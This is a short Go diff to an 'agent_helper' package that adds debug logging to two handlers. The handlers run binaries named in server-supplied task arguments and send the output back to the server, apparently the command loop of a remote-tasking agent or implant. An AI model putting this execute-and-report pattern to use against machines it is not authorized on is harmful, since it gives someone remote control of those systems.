@@ -4,13 +4,18 @@ package agent_helper
 
 import (
 	"bytes"
+	"fmt"
 	"os"
 	"os/exec"
+	"galleon/debug"
 	"strings"
 )
 
 func ExecBgHandler(serverUrl string, taskData map[string]interface{}) {
 	binary := strings.Split(taskData["args"].(string), " ")
+	if debug.Debug {
+		fmt.Printf("[*] exec_bg: %s %v\n", binary[0], binary[1:])
+	}
 	output, err := execBinary(binary[0], binary[1:], true)
 	if err != nil {
 		DataShipper(serverUrl, taskData, err.Error())
@@ -21,6 +26,9 @@ func ExecBgHandler(serverUrl string, taskData map[string]interface{}) {
 
 func ExecFgHandler(serverUrl string, taskData map[string]interface{}) {
 	binary := strings.Split(taskData["args"].(string), " ")
+	if debug.Debug {
+		fmt.Printf("[*] exec_fg: %s %v\n", binary[0], binary[1:])
+	}
 	output, err := execBinary(binary[0], binary[1:], false)
 	if err != nil {
 		DataShipper(serverUrl, taskData, err.Error())
